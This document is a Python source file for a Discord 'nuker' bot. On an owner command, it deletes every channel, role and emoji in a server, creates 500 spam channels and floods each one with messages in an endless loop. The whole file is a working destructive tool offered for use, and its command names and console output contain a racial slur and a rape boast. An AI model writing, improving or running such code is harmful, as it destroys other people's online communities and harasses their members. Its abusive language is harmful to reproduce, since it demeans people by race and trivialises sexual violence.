import discord
from discord.ext import commands
import random
from colorama import Fore
import os
import time
from pystyle import *

os.system('cls')
time.sleep(1)
os.system("title Stanford ┃ By: few")
os.system('cls')
time.sleep(1)
token = (Write.Input(f"""
╔═╗┌┬┐┌─┐┌┐┌┌─┐┌─┐┬─┐┌┬┐
╚═╗ │ ├─┤│││├┤ │ │├┬┘ ││
╚═╝ ┴ ┴ ┴┘└┘└  └─┘┴└──┴┘
╔══Insert token\n╚══► """, Colors.yellow_to_red, interval=0.00001))
spam = (Write.Input(f'╔══What should be the name of the guilds\n╚══► ', Colors.yellow_to_red, interval=0.000001))
spamm = (Write.Input(f'╔══What message would you like to spam\n╚══► ', Colors.yellow_to_red, interval=0.000001))


SPAM_CHANNEL =  [spam]
SPAM_MESSAGE = [spamm]

headers = {
    "Authorization"
}

client = commands.Bot(command_prefix="!")
intents=discord.Intents.all()

os.system('cls')
time.sleep(1)
@client.event
async def on_ready():
   Write.Print(f"""
╔═╗┌┬┐┌─┐┌┐┌┌─┐┌─┐┬─┐┌┬┐
╚═╗ │ ├─┤│││├┤ │ │├┬┘ ││
╚═╝ ┴ ┴ ┴┘└┘└  └─┘┴└──┴┘
Github: @bvllet\nCurrent Discord: few#0002 | This is my rel account#0001 \n
╔══Bot - {client.user}\n╚══► Connected
╔══Prefix\n╚══► " ! "
╔══Commands\n╚══► sad = Dropping The Nuke. | noniggercancerstopcommand = To stop the nuke + log-out.
 """, Colors.red_to_yellow, interval=0.00001)
   await client.change_presence(status=discord.Status.do_not_disturb, activity=discord.Activity(type=discord.ActivityType.listening, name= f"clippy.link/sex | Github: @byaki"))

@client.command()
@commands.is_owner() #~ delete this whole line of code so everyone can use this command (this command STOPS THE BOTS NUKE!!)
async def noniggercancerstopcommand(ctx): #~ stop command
    await ctx.bot.logout()
    print (Fore.BLUE + f"{client.user.name} has logged out successfully.")

@client.command()
@commands.is_owner() #~ delete this whole line of code so everyone can use this command (this command STARTS THE BOTS NUKE!!)
async def sad(ctx): #~ start command / nuke
    await ctx.message.delete()
    guild = ctx.guild
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.GREEN + f"{channel.name}[V] Was deleted succesfull.")
      except:
        print(Fore.RED + f"{channel.name}[!] Could not be deleted! (missing perms?)")
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.GREEN + f"{role.name}[V] Has been deleted succesfull.")
     except:
       print(Fore.RED + f"{role.name}[!] Has not been deleted! (missing perms?) OR (bot role)?")
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.GREEN + f"{emoji.name}[V] Was deleted succesfull.")
     except:
       print(Fore.RED + f"{emoji.name}[!] Has not been Deleted! (missing perms?)")
    await guild.create_text_channel("github is bvllet")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"{Fore.MAGENTA}[V] Raped {guild.name} Successfully😈")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))
client.run(token, bot=True)
